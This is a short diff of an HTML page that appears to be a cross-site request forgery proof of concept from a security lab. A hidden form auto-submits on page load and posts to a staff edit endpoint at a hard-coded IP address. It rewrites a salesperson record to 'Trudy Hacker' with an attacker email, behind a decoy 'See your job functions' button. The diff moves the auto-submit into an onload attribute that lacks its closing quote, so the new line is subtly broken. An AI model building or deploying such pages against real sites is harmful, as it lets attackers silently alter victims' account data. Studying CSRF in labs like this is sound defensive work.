@@ -17,7 +17,7 @@
         <input type="text" name="email" value="hacker@gmail.com">
     </form>
 </body> -->
-    <body>
+    <body onload="document.csrfForm.submit()>
     <form name="csrfForm" action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=1" method="POST">
         <input type="hidden" name="first_name" value="Trudy">
         <input type="hidden" name="last_name" value="Hacker">
@@ -25,9 +25,6 @@
         <input type="hidden" name="email" value="hacker@gmail.com">
         <input type="submit" value="See your job functions">
     </form>
-    <script>
-        document.csrfForm.submit();
-    </script>
         
 </body>
 </html>
